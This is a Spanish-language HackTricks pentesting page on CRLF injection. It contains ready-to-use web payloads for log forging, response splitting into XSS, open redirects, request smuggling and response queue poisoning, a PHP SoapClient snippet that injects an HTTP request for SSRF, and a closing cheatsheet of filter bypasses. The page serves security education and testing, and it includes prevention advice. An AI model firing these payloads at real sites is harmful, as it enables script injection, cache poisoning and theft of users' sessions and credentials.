# Inyecci√≥n de CRLF (%0D%0A)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si est√°s interesado en una **carrera de hacking** y hackear lo inhackeable, ¬°**estamos contratando**! (_se requiere fluidez en polaco escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

## ¬øQu√© es CRLF?

Cuando un navegador env√≠a una solicitud a un servidor web, el servidor web responde con una respuesta que contiene tanto las cabeceras de respuesta HTTP como el contenido real del sitio web, es decir, el cuerpo de la respuesta. Las cabeceras HTTP y la respuesta HTML (el contenido del sitio web) est√°n separados por una combinaci√≥n espec√≠fica de caracteres especiales, a saber, un retorno de carro y un salto de l√≠nea. En resumen, tambi√©n se conocen como CRLF.

El servidor web utiliza el CRLF para entender cu√°ndo comienza una nueva cabecera HTTP y cu√°ndo termina otra. El CRLF tambi√©n puede indicar a una aplicaci√≥n web o a un usuario que comienza una nueva l√≠nea en un archivo o en un bloque de texto. Los caracteres CRLF son un mensaje est√°ndar HTTP/1.1, por lo que se utilizan en cualquier tipo de servidor web, incluyendo Apache, Microsoft IIS y otros.\
De [https://www.netsparker.com/blog/web-security/crlf-http-header/#](https://www.netsparker.com/blog/web-security/crlf-http-header/)

### ¬øQu√© es la Vulnerabilidad de Inyecci√≥n de CRLF?

En un ataque de vulnerabilidad de inyecci√≥n de CRLF, el atacante inserta tanto el retorno de carro como los caracteres de salto de l√≠nea en la entrada del usuario para enga√±ar al servidor, a la aplicaci√≥n web o al usuario haci√©ndoles creer que se ha terminado un objeto y que ha comenzado otro. Por lo tanto, las secuencias de CRLF no son caracteres maliciosos, sin embargo, pueden ser utilizados con intenciones maliciosas, para la divisi√≥n de respuestas HTTP, etc.

## Inyecci√≥n de CRLF en aplicaciones web

En las aplicaciones web, una inyecci√≥n de CRLF puede tener impactos graves, dependiendo de lo que la aplicaci√≥n haga con los elementos individuales. Los impactos pueden variar desde la divulgaci√≥n de informaci√≥n hasta la ejecuci√≥n de c√≥digo, una vulnerabilidad de seguridad directa en la aplicaci√≥n web. De hecho, un ataque de inyecci√≥n de CRLF puede tener repercusiones muy graves en una aplicaci√≥n web, aunque nunca se haya incluido en la lista OWASP Top 10. Por ejemplo, tambi√©n es posible manipular archivos de registro en un panel de administraci√≥n, como se explica en el siguiente ejemplo.

#### Un ejemplo de Inyecci√≥n de CRLF en un archivo de registro

Imagina un archivo de registro en un panel de administraci√≥n con el patr√≥n de flujo de salida de IP - Hora - Ruta visitada, como se muestra a continuaci√≥n:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Si un atacante es capaz de inyectar los caracteres CRLF en la solicitud HTTP, puede cambiar el flujo de salida y falsificar las entradas de registro. Puede cambiar la respuesta de la aplicaci√≥n web a algo como lo siguiente:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
El %0d y %0a son las formas codificadas en URL de CR y LF. Por lo tanto, las entradas de registro se ver√≠an as√≠ despu√©s de que el atacante insertara esos caracteres y la aplicaci√≥n los muestra:

IP - Hora - Ruta visitada
```
123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Por lo tanto, al explotar una vulnerabilidad de inyecci√≥n CRLF, el atacante puede falsificar entradas en el archivo de registro para ocultar sus propias acciones maliciosas. El atacante est√° literalmente secuestrando la p√°gina y modificando la respuesta. Por ejemplo, imagina un escenario en el que el atacante tiene la contrase√±a de administrador y ejecuta el par√°metro restrictedaction, que solo puede ser utilizado por un administrador.

El problema es que si el administrador se da cuenta de que una IP desconocida utiliz√≥ el par√°metro restrictedaction, notar√° que algo est√° mal. Sin embargo, como ahora parece que el comando fue emitido por el localhost (y, por lo tanto, probablemente por alguien que tiene acceso al servidor, como un administrador), no parece sospechoso.

Toda la parte de la consulta que comienza con %0d%0a ser√° tratada por el servidor como un par√°metro. Despu√©s de eso, hay otro & con el par√°metro restrictedaction que ser√° analizado por el servidor como otro par√°metro. Efectivamente, esta ser√≠a la misma consulta que:
```
/index.php?page=home&restrictedaction=edit
```
### HTTP Response Splitting

#### Descripci√≥n

Dado que el encabezado de una respuesta HTTP y su cuerpo est√°n separados por caracteres CRLF, un atacante puede intentar inyectarlos. Una combinaci√≥n de CRLFCRLF indicar√° al navegador que el encabezado termina y el cuerpo comienza. Esto significa que ahora puede escribir datos dentro del cuerpo de la respuesta donde se almacena el c√≥digo HTML. Esto puede llevar a una vulnerabilidad de Cross-site Scripting.

#### Un ejemplo de HTTP Response Splitting que lleva a XSS

Imagina una aplicaci√≥n que establece un encabezado personalizado, por ejemplo:
```
X-Your-Name: Bob
```
El valor del encabezado se establece a trav√©s de un par√°metro GET llamado "name". Si no se realiza ninguna codificaci√≥n de URL y el valor se refleja directamente dentro del encabezado, es posible que un atacante pueda insertar la combinaci√≥n mencionada anteriormente de CRLFCRLF para indicar al navegador que comienza el cuerpo de la solicitud. De esta manera, puede insertar datos como una carga √∫til XSS, por ejemplo:
```
?name=Bob%0d%0a%0d%0a<script>alert(document.domain)</script>
```
El c√≥digo anterior mostrar√° una ventana de alerta en el contexto del dominio atacado.

#### Un ejemplo de HTTP Response Splitting que conduce a una redirecci√≥n

{% embed url="https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62" %}

Navegador a:
```
/%0d%0aLocation:%20http://myweb.com
```
Y el servidor responde con el encabezado:
```
Location: http://myweb.com
```
**Otro ejemplo: (de** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### En la ruta URL

Puedes enviar la carga √∫til **dentro de la ruta URL** para controlar la **respuesta** del servidor:
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### Inyecci√≥n de encabezado HTTP

#### Descripci√≥n

Al explotar una inyecci√≥n CRLF, un atacante tambi√©n puede insertar encabezados HTTP que podr√≠an usarse para derrotar mecanismos de seguridad como el filtro XSS de un navegador o la misma pol√≠tica de origen. Esto permite al atacante obtener informaci√≥n sensible como tokens CSRF. Tambi√©n puede establecer cookies que podr√≠an ser explotadas al iniciar sesi√≥n en la cuenta del atacante o al explotar vulnerabilidades de [cross-site scripting (XSS)](https://www.netsparker.com/blog/web-security/cross-site-scripting-xss/) que de otra manera no se podr√≠an explotar.

#### Un ejemplo de inyecci√≥n de encabezado HTTP para extraer datos sensibles

Si un atacante puede inyectar los encabezados HTTP que activan CORS (Compartir recursos de origen cruzado), puede usar JavaScript para acceder a recursos que est√°n protegidos por SOP (Pol√≠tica de mismo origen), que evita que los sitios de diferentes or√≠genes se accedan entre s√≠.

### Nueva solicitud HTTP en SSRF

Al abusar de la inyecci√≥n CRLF, puedes **crear una nueva solicitud HTTP e inyectarla**.\
Un buen ejemplo se puede hacer usando el gadget de deserializaci√≥n `SoapClient` en PHP. Esta clase es **vulnerable a CRLF** dentro del par√°metro `user_agent`, lo que permite **insertar nuevos encabezados y contenido del cuerpo**. Sin embargo, incluso puedes aprovechar esta vulnerabilidad para **inyectar una nueva solicitud HTTP**:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

#Put a nc listening in port 9090
$client->__soapCall("test", []);
```
### Inyecci√≥n de encabezados para el contrabando de solicitudes

Puedes inyectar encabezados esenciales para asegurarte de que el **back-end mantenga la conexi√≥n abierta** despu√©s de responder a la solicitud inicial:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
A continuaci√≥n, **especifique una segunda solicitud**. Aqu√≠ tienes un [**ataque cl√°sico** de **inserci√≥n de solicitudes**](http-request-smuggling/) con **encabezados/cuerpo adicionales** agregados por el servidor despu√©s de la inyecci√≥n.\
Aqu√≠ hay dos de las muchas opciones para la explotaci√≥n entre usuarios.

Especificar un **prefijo malicioso** para envenenar la solicitud del pr√≥ximo usuario o una cach√© web:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

O crear nuestro prefijo para combinarlo con la basura final y crear una segunda solicitud completa para desencadenar el **envenenamiento de la cola de respuestas**.

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

Para obtener m√°s informaci√≥n sobre esta t√©cnica y los problemas potenciales, [**consulte la fuente original**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

### Inyecci√≥n de Memcache

Memcache es un **almacenamiento de clave-valor que utiliza un protocolo de texto claro**. M√°s informaci√≥n en:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

Si una plataforma toma **datos de una solicitud HTTP y los utiliza sin sanitizar** para realizar **solicitudes** a un servidor **memcache**, un atacante podr√≠a abusar de este comportamiento para **inyectar nuevos comandos de memcache**.

Por ejemplo, en la vulnerabilidad original descubierta, se utilizaron claves de cach√© para devolver la IP y el puerto a los que un usuario deber√≠a conectarse, y los atacantes pudieron **inyectar comandos de memcache** que **envenenar√≠an** la **cach√© para enviar los detalles de las v√≠ctimas** (incluidos nombres de usuario y contrase√±as) a los servidores del atacante:

<figure><img src="../.gitbook/assets/image (6) (1) (4).png" alt=""><figcaption></figcaption></figure>

Adem√°s, los investigadores tambi√©n descubrieron que pod√≠an desincronizar las respuestas de memcache para enviar las IP y los puertos de los atacantes a usuarios cuyo correo electr√≥nico el atacante no conoc√≠a:

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

**Para obtener toda la informaci√≥n, lee el** [**informe original**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/).

## Impactos de la Vulnerabilidad de Inyecci√≥n de CRLF

El impacto de las inyecciones de CRLF var√≠a e incluye todos los impactos de la ejecuci√≥n de c√≥digo en sitios cruzados hasta la divulgaci√≥n de informaci√≥n. Tambi√©n puede desactivar ciertas restricciones de seguridad como los filtros XSS y la Pol√≠tica de mismo origen en los navegadores de la v√≠ctima, dej√°ndolos susceptibles a ataques maliciosos.

### C√≥mo prevenir las Inyecciones de CRLF / Encabezados HTTP en Aplicaciones Web

La mejor t√©cnica de prevenci√≥n es no utilizar la entrada de los usuarios directamente dentro de los encabezados de respuesta. Si eso no es posible, siempre debes usar una funci√≥n para codificar los caracteres especiales de CRLF. Otra buena pr√°ctica de seguridad de aplicaciones web es actualizar tu lenguaje de programaci√≥n a una versi√≥n que no permita la inyecci√≥n de CR y LF dentro de las funciones que establecen los encabezados HTTP.

### CHEATSHEET
```
1. HTTP Response Splitting
‚Ä¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
‚Ä¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
‚Ä¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
‚Ä¢ /google.com/%2F..%0D%0AHeader-Test:test2
‚Ä¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
‚Ä¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
‚Ä¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
‚Ä¢ %E5%98%8A = %0A = \u560a
‚Ä¢ %E5%98%8D = %0D = \u560d
‚Ä¢ %E5%98%BE = %3E = \u563e (>)
‚Ä¢ %E5%98%BC = %3C = \u563c (<)
‚Ä¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Herramienta

{% embed url="https://github.com/dwisiswant0/crlfuzz" %}

## Lista de Detecci√≥n de Fuerza Bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt" %}

## Referencias

* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si est√°s interesado en una **carrera de hacking** y hackear lo imposible - ¬°**estamos contratando!** (_se requiere fluidez en polaco, tanto escrito como hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
